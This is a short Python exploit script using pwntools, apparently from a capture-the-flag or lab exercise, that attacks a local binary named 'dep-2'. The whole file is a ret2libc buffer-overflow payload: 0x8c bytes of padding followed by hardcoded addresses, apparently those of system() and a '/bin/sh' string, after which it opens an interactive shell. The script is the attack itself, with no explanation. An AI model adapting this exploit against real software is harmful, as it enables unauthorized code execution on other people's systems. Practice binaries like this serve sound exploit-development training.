#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process('./dep-2')
#gdb.attach(p)

payload = "A" * 0x8c + p32(0xf7e39da0) + "BBBB" + p32(0xf7f5aa0b)

p.sendline(payload)

print(p.recv())

p.interactive()
